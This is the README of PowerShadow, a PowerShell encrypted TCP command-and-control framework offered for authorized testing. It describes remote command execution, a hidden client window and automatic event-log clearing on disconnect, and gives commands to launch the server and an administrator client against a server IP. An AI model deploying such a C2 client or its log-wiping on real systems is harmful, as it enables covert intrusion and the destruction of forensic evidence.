# PowerShadow

PowerShadow is an advanced, encrypted TCP Command & Control (C2) framework written in PowerShell. It is designed for authorized security testing and educational purposes. PowerShadow features secure key derivation using PBKDF2, a hidden client window, and automated event log clearance on disconnect. The default TCP port is **9090**.

> **WARNING:**  
> This tool is intended for **authorized and ethical** security testing only. Misuse of this tool may be illegal and unethical. Always obtain explicit permission before testing any system.

---

## Features

- **Encrypted Communication:**  
   Commands entered on the server are encrypted using AES‑256 (CBC with PKCS7 padding) and sent over TCP
    with a 4‑byte length prefix. The client decrypts and executes the command, then encrypts the output
    and sends it back using the same protocol.

- **Secure Key Derivation:**  
  Derives the encryption key and IV from a user‑supplied passphrase (entered securely) and a shared salt using PBKDF2—avoiding hard‑coded keys.

- **Length‑Prefixed TCP Protocol:**  
  Implements a simple length‑prefixed protocol to reliably transmit encrypted messages over TCP.

- **Hidden Client Window:**  
  On Windows, the client’s PowerShell window is hidden for improved stealth.

- **Event Log Clearance:**  
  When the connection ends, the client automatically clears selected Windows and PowerShell event logs to reduce forensic traces.

- **Customizable Default Port:**  
  The default TCP port is **9090**. This can be modified via command‑line parameters.

---

## Installation

1. **Clone the Repository:**

   ```bash
   git clone https://github.com/sudoplunder/powershadow.git
   cd powershadow

## Execution
- **Server:**
```powershell
sudo pwsh ./powershadow.ps1 -Mode Server -Port 9090
```
- **Client (As Administrator):**
```powershell
.\powershadow.ps1 -Mode Client -ServerIP <server_ip> -Port 9090
```
